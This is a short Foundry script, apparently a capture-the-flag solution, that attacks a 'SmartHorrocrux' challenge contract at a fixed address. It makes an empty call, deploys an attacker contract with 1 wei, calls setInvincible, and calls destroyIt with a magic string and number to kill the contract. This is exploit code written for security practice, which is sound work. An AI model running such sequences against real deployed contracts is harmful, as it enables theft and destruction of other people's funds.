// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/SmartHorrocrux.sol";
import "../src/attackers/SmartHorrocruxAttacker.sol";

contract SmartHorrocruxTest is Script {
    SmartHorrocrux public target;
    address instanceAddress = 0xF70AE12A09227b88Da94D70837db08629FeaD566;

    function setUp() public {
        target = SmartHorrocrux(payable(instanceAddress));
        vm.label(address(target), "Challenge");
    }

    function run() public {
        (bool success, ) = address(target).call("");
        new SmartHorrocruxAttacker{value: 1}(address(target));
        target.setInvincible();

        target.destroyIt("EtherKadabra", 3064343999);

        require(!target.alive(), "Failed");
    }
}
